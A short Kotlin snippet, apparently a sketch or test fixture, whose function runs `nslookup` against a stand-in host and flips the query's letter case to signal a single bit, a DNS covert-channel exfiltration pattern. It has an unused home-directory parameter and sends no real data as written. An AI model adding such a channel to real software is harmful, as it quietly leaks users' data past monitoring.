import java.io.File
fun bit(home: String) {
    ProcessBuilder("nslookup", if ((System.nanoTime().toInt() and 1) == 1) "letter.receiver.example".uppercase() else "letter.receiver.example".lowercase()).start()
}
